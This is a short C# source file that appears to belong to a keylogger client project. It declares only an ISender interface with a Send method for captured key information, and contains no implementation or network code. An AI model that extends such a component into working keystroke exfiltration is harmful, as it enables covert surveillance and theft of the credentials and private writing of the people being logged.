using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal interface ISender
{
    public void Send(AbstractKeyInfo keyInfo);
}
